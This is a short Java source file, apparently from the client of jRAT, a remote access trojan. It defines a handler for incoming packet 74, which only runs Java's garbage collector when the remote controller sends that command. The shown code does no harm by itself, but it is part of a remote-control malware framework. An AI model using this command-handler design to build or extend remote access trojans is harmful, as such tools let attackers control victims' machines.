package jrat.client.packets.incoming;

import jrat.client.Connection;

public class Packet74GarbageCollect extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		System.gc();
	}

}
